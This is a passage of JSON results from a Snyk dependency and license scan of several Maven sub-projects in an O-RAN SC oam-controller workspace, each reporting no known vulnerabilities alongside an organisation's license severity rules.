          "instructions": ""
        },
        "LGPL-2.1": {
          "licenseType": "LGPL-2.1",
          "severity": "medium",
          "instructions": ""
        },
        "LGPL-3.0": {
          "licenseType": "LGPL-3.0",
          "severity": "medium",
          "instructions": ""
        },
        "MPL-1.1": {
          "licenseType": "MPL-1.1",
          "severity": "medium",
          "instructions": ""
        },
        "MPL-2.0": {
          "licenseType": "MPL-2.0",
          "severity": "medium",
          "instructions": ""
        },
        "MS-RL": {
          "licenseType": "MS-RL",
          "severity": "medium",
          "instructions": ""
        },
        "SimPL-2.0": {
          "licenseType": "SimPL-2.0",
          "severity": "high",
          "instructions": ""
        }
      }
    },
    "packageManager": "maven",
    "ignoreSettings": {
      "adminOnly": false,
      "reasonRequired": false,
      "disregardFilesystemIgnores": false
    },
    "summary": "No known vulnerabilities",
    "filesystemPolicy": false,
    "uniqueCount": 0,
    "projectName": "org.o-ran-sc.oam-oam-controller.parent:mdsal-it-parent",
    "foundProjectCount": 20,
    "displayTargetFile": "parents/odlparent/mdsal-it-parent/pom.xml",
    "hasUnknownVersions": false,
    "path": "/Users/mohammedimaduddin/Desktop/oran/oransc-sanity/imad/scripts/snyk-scan-workspace/oam_oam-controller"
  },
  {
    "vulnerabilities": [],
    "ok": true,
    "dependencyCount": 1,
    "org": "mdimado",
    "policy": "# Snyk (https://snyk.io) policy file, patches or ignores known vulnerabilities.\nversion: v1.25.1\nignore: {}\npatch: {}\n",
    "isPrivate": true,
    "licensesPolicy": {
      "severities": {},
      "orgLicenseRules": {
        "AGPL-1.0": {
          "licenseType": "AGPL-1.0",
          "severity": "high",
          "instructions": ""
        },
        "AGPL-3.0": {
          "licenseType": "AGPL-3.0",
          "severity": "high",
          "instructions": ""
        },
        "Artistic-1.0": {
          "licenseType": "Artistic-1.0",
          "severity": "medium",
          "instructions": ""
        },
        "Artistic-2.0": {
          "licenseType": "Artistic-2.0",
          "severity": "medium",
          "instructions": ""
        },
        "CDDL-1.0": {
          "licenseType": "CDDL-1.0",
          "severity": "medium",
          "instructions": ""
        },
        "CPOL-1.02": {
          "licenseType": "CPOL-1.02",
          "severity": "high",
          "instructions": ""
        },
        "EPL-1.0": {
          "licenseType": "EPL-1.0",
          "severity": "medium",
          "instructions": ""
        },
        "GPL-2.0": {
          "licenseType": "GPL-2.0",
          "severity": "high",
          "instructions": ""
        },
        "GPL-3.0": {
          "licenseType": "GPL-3.0",
          "severity": "high",
          "instructions": ""
        },
        "LGPL-2.0": {
          "licenseType": "LGPL-2.0",
          "severity": "medium",
          "instructions": ""
        },
        "LGPL-2.1": {
          "licenseType": "LGPL-2.1",
          "severity": "medium",
          "instructions": ""
        },
        "LGPL-3.0": {
          "licenseType": "LGPL-3.0",
          "severity": "medium",
          "instructions": ""
        },
        "MPL-1.1": {
          "licenseType": "MPL-1.1",
          "severity": "medium",
          "instructions": ""
        },
        "MPL-2.0": {
          "licenseType": "MPL-2.0",
          "severity": "medium",
          "instructions": ""
        },
        "MS-RL": {
          "licenseType": "MS-RL",
          "severity": "medium",
          "instructions": ""
        },
        "SimPL-2.0": {
          "licenseType": "SimPL-2.0",
          "severity": "high",
          "instructions": ""
        }
      }
    },
    "packageManager": "maven",
    "ignoreSettings": {
      "adminOnly": false,
      "reasonRequired": false,
      "disregardFilesystemIgnores": false
    },
    "summary": "No known vulnerabilities",
    "filesystemPolicy": false,
    "uniqueCount": 0,
    "projectName": "org.o-ran-sc.oam-oam-controller.parent:odlparent",
    "foundProjectCount": 20,
    "displayTargetFile": "parents/odlparent/odlparent/pom.xml",
    "hasUnknownVersions": false,
    "path": "/Users/mohammedimaduddin/Desktop/oran/oransc-sanity/imad/scripts/snyk-scan-workspace/oam_oam-controller"
  },
  {
    "vulnerabilities": [],
    "ok": true,
    "dependencyCount": 0,
    "org": "mdimado",
    "policy": "# Snyk (https://snyk.io) policy file, patches or ignores known vulnerabilities.\nversion: v1.25.1\nignore: {}\npatch: {}\n",
    "isPrivate": true,
    "licensesPolicy": {
      "severities": {},
      "orgLicenseRules": {
        "AGPL-1.0": {
          "licenseType": "AGPL-1.0",
          "severity": "high",
          "instructions": ""
        },
        "AGPL-3.0": {
          "licenseType": "AGPL-3.0",
          "severity": "high",
          "instructions": ""
        },
        "Artistic-1.0": {
          "licenseType": "Artistic-1.0",
          "severity": "medium",
          "instructions": ""
        },
        "Artistic-2.0": {
          "licenseType": "Artistic-2.0",
          "severity": "medium",
          "instructions": ""
        },
        "CDDL-1.0": {
          "licenseType": "CDDL-1.0",
          "severity": "medium",
          "instructions": ""
        },
        "CPOL-1.02": {
          "licenseType": "CPOL-1.02",
          "severity": "high",
          "instructions": ""
        },
        "EPL-1.0": {
          "licenseType": "EPL-1.0",
          "severity": "medium",
          "instructions": ""
        },
        "GPL-2.0": {
          "licenseType": "GPL-2.0",
          "severity": "high",
          "instructions": ""
        },
        "GPL-3.0": {
          "licenseType": "GPL-3.0",
          "severity": "high",
          "instructions": ""
        },
        "LGPL-2.0": {
          "licenseType": "LGPL-2.0",
          "severity": "medium",
          "instructions": ""
        },
        "LGPL-2.1": {
          "licenseType": "LGPL-2.1",
          "severity": "medium",
          "instructions": ""
        },
        "LGPL-3.0": {
          "licenseType": "LGPL-3.0",
          "severity": "medium",
          "instructions": ""
        },
        "MPL-1.1": {
          "licenseType": "MPL-1.1",
          "severity": "medium",
          "instructions": ""
        },
        "MPL-2.0": {
          "licenseType": "MPL-2.0",
          "severity": "medium",
          "instructions": ""
        },
        "MS-RL": {
          "licenseType": "MS-RL",
          "severity": "medium",
          "instructions": ""
        },
        "SimPL-2.0": {
          "licenseType": "SimPL-2.0",
          "severity": "high",
          "instructions": ""
        }
      }
    },
    "packageManager": "maven",
    "ignoreSettings": {
      "adminOnly": false,
      "reasonRequired": false,
      "disregardFilesystemIgnores": false
    },
    "summary": "No known vulnerabilities",
    "filesystemPolicy": false,
    "uniqueCount": 0,
    "projectName": "org.o-ran-sc.oam-oam-controller.parent:odlparent-lite",
    "foundProjectCount": 20,
    "displayTargetFile": "parents/odlparent/odlparent-lite/pom.xml",
    "hasUnknownVersions": false,
    "path": "/Users/mohammedimaduddin/Desktop/oran/oransc-sanity/imad/scripts/snyk-scan-workspace/oam_oam-controller"
  },
  {
    "vulnerabilities": [],
    "ok": true,
    "dependencyCount": 0,
    "org": "mdimado",
    "policy": "# Snyk (https://snyk.io) policy file, patches or ignores known vulnerabilities.\nversion: v1.25.1\nignore: {}\npatch: {}\n",
    "isPrivate": true,
    "licensesPolicy": {
      "severities": {},
      "orgLicenseRules": {
        "AGPL-1.0": {
          "licenseType": "AGPL-1.0",
          "severity": "high",
          "instructions": ""
        },
        "AGPL-3.0": {
          "licenseType": "AGPL-3.0",
          "severity": "high",
          "instructions": ""
        },
        "Artistic-1.0": {
          "licenseType": "Artistic-1.0",
          "severity": "medium",
          "instructions": ""
        },
        "Artistic-2.0": {
          "licenseType": "Artistic-2.0",
          "severity": "medium",
          "instructions": ""
        },
        "CDDL-1.0": {
          "licenseType": "CDDL-1.0",
          "severity": "medium",
          "instructions": ""
        },
        "CPOL-1.02": {
          "licenseType": "CPOL-1.02",
          "severity": "high",
          "instructions": ""
        },
        "EPL-1.0": {
          "licenseType": "EPL-1.0",
          "severity": "medium",
          "instructions": ""
        },
        "GPL-2.0": {
          "licenseType": "GPL-2.0",
          "severity": "high",
          "instructions": ""
        },
        "GPL-3.0": {
          "licenseType": "GPL-3.0",
          "severity": "high",
          "instructions": ""
        },
        "LGPL-2.0": {
          "licenseType": "LGPL-2.0",
          "severity": "medium",
          "instructions": ""
        },
        "LGPL-2.1": {
          "licenseType": "LGPL-2.1",
          "severity": "medium",
          "instructions": ""
        },
        "LGPL-3.0": {
          "licenseType": "LGPL-3.0",
          "severity": "medium",
          "instructions": ""
        },
        "MPL-1.1": {
          "licenseType": "MPL-1.1",
          "severity": "medium",
          "instructions": ""
        },
        "MPL-2.0": {
          "licenseType": "MPL-2.0",
          "severity": "medium",
          "instructions": ""
        },
        "MS-RL": {
          "licenseType": "MS-RL",
          "severity": "medium",
          "instructions": ""
        },
        "SimPL-2.0": {
          "licenseType": "SimPL-2.0",
          "severity": "high",
          "instructions": ""
        }
      }
    },
    "packageManager": "maven",
    "ignoreSettings": {
      "adminOnly": false,
      "reasonRequired": false,
      "disregardFilesystemIgnores": false
    },
    "summary": "No known vulnerabilities",
    "filesystemPolicy": false,
    "uniqueCount": 0,
    "projectName": "org.o-ran-sc.oam-oam-controller.parent:setup",
    "foundProjectCount": 20,
    "displayTargetFile": "parents/odlparent/setup/pom.xml",
    "hasUnknownVersions": false,
    "path": "/Users/mohammedimaduddin/Desktop/oran/oransc-sanity/imad/scripts/snyk-scan-workspace/oam_oam-controller"
  },
  {
    "vulnerabilities": [],
    "ok": true,
    "dependencyCount": 1,
    "org": "mdimado",
    "policy": "# Snyk (https://snyk.io) policy file, patches or ignores known vulnerabilities.\nversion: v1.25.1\nignore: {}\npatch: {}\n",
    "isPrivate": true,
    "licensesPolicy": {
      "severities": {},
      "orgLicenseRules": {
        "AGPL-1.0": {
          "licenseType": "AGPL-1.0",
          "severity": "high",
          "instructions": ""
        },
        "AGPL-3.0": {
          "licenseType": "AGPL-3.0",
          "severity": "high",
          "instructions": ""
        },
        "Artistic-1.0": {
          "licenseType": "Artistic-1.0",
          "severity": "medium",
          "instructions": ""
        },
        "Artistic-2.0": {
          "licenseType": "Artistic-2.0",
          "severity": "medium",
          "instructions": ""
        },
        "CDDL-1.0": {
          "licenseType": "CDDL-1.0",
          "severity": "medium",
          "instructions": ""
        },
        "CPOL-1.02": {
          "licenseType": "CPOL-1.02",
          "severity": "high",
          "instructions": ""
        },
        "EPL-1.0": {
          "licenseType": "EPL-1.0",
          "severity": "medium",
          "instructions": ""
        },
        "GPL-2.0": {
          "licenseType": "GPL-2.0",
          "severity": "high",
          "instructions": ""
        },
        "GPL-3.0": {
          "licenseType": "GPL-3.0",
          "severity": "high",
          "instructions": ""
        },
        "LGPL-2.0": {
          "licenseType": "LGPL-2.0",
          "severity": "medium",
          "instructions": ""
        },
        "LGPL-2.1": {
          "licenseType": "LGPL-2.1",
          "severity": "medium",
          "instructions": ""
        },
        "LGPL-3.0": {
          "licenseType": "LGPL-3.0",
          "severity": "medium",
          "instructions": ""
        },
        "MPL-1.1": {
          "licenseType": "MPL-1.1",
          "severity": "medium",
          "instructions": ""
        },
        "MPL-2.0": {
          "licenseType": "MPL-2.0",
          "severity": "medium",
          "instructions": ""
        },
        "MS-RL": {
          "licenseType": "MS-RL",
          "severity": "medium",
          "instructions": ""
        },
        "SimPL-2.0": {
          "licenseType": "SimPL-2.0",
          "severity": "high",
          "instructions": ""
        }
      }
    },
    "packageManager": "maven",
    "ignoreSettings": {
      "adminOnly": false,
      "reasonRequired": false,
      "disregardFilesystemIgnores": false
    },
    "summary": "No known vulnerabilities",
    "filesystemPolicy": false,
    "uniqueCount": 0,
    "projectName": "org.o-ran-sc.oam-oam-controller.parent:single-feature-parent",
    "foundProjectCount": 20,
    "displayTargetFile": "parents/odlparent/single-feature-parent/pom.xml",
    "hasUnknownVersions": false,
    "path": "/Users/mohammedimaduddin/Desktop/oran/oransc-sanity/imad/scripts/snyk-scan-workspace/oam_oam-controller"
  },
  {
    "vulnerabilities": [],
    "ok": true,
    "dependencyCount": 2,
    "org": "mdimado",
    "policy": "# Snyk (https://snyk.io) policy file, patches or ignores known vulnerabilities.\nversion: v1.25.1\nignore: {}\npatch: {}\n",
    "isPrivate": true,
    "licensesPolicy": {
      "severities": {},
      "orgLicenseRules": {
        "AGPL-1.0": {
          "licenseType": "AGPL-1.0",
          "severity": "high",
          "instructions": ""
        },
        "AGPL-3.0": {
          "licenseType": "AGPL-3.0",
          "severity": "high",
          "instructions": ""
        },
        "Artistic-1.0": {
          "licenseType": "Artistic-1.0",
          "severity": "medium",
          "instructions": ""
        },
        "Artistic-2.0": {
          "licenseType": "Artistic-2.0",
          "severity": "medium",
          "instructions": ""
        },
        "CDDL-1.0": {
          "licenseType": "CDDL-1.0",
          "severity": "medium",
          "instructions": ""
        },
        "CPOL-1.02": {
          "licenseType": "CPOL-1.02",
          "severity": "high",
          "instructions": ""
        },
        "EPL-1.0": {
          "licenseType": "EPL-1.0",
          "severity": "medium",
          "instructions": ""
        },
        "GPL-2.0": {
          "licenseType": "GPL-2.0",
          "severity": "high",
          "instructions": ""
        },
        "GPL-3.0": {
          "licenseType": "GPL-3.0",
          "severity": "high",
          "instructions": ""
        },
        "LGPL-2.0": {
          "licenseType": "LGPL-2.0",
          "severity": "medium",
          "instructions": ""
        },
        "LGPL-2.1": {
          "licenseType": "LGPL-2.1",
          "severity": "medium",
          "instructions": ""
        },
        "LGPL-3.0": {
          "licenseType": "LGPL-3.0",
          "severity": "medium",
          "instructions": ""
        },
        "MPL-1.1": {
          "licenseType": "MPL-1.1",
          "severity": "medium",
          "instructions": ""
        },
        "MPL-2.0": {
          "licenseType": "MPL-2.0",
          "severity": "medium",
          "instructions": ""
        },
        "MS-RL": {
          "licenseType": "MS-RL",
          "severity": "medium",
          "instructions": ""
        },
        "SimPL-2.0": {
          "licenseType": "SimPL-2.0",
          "severity": "high",
          "instructions": ""
        }
      }
    },
    "packageManager": "maven",
    "ignoreSettings": {
      "adminOnly": false,
      "reasonRequired": false,
      "disregardFilesystemIgnores": false
    },
    "summary": "No known vulnerabilities",
    "filesystemPolicy": false,
    "uniqueCount": 0,
    "projectName": "org.o-ran-sc.oam-oam-controller.parent:oparent",
    "foundProjectCount": 20,
    "displayTargetFile": "parents/oparent/pom.xml",
    "hasUnknownVersions": false,
    "path": "/Users/mohammedimaduddin/Desktop/oran/oransc-sanity/imad/scripts/snyk-scan-workspace/oam_oam-controller"
  }
]
